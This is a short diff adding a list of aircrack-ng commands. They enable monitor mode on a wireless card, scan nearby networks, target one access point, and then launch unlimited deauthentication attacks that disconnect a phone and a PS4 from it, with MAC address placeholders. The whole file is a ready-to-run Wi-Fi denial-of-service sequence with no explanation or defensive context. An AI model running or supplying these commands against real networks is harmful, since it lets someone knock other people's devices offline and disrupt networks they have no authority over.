@@ -1,0 +1,7 @@
+sudo airmon-ng start wlan0
+sudo airmon-ng check kill
+sudo airodump-ng wlan0
+sudo airodump-ng --bssid $AP_MAC_ADDR wlan0
+sudo airodump-ng -c11 -d $AP_MAC_ADDR wlan0
+sudo aireplay-ng -0 0 -a $AP_MAC_ADDR -c $PHONE_MAC_ADDR wlan0
+sudo aireplay-ng -0 0 -a $AP_MAC_ADDR -c $PS4_MAC_ADDR wlan0
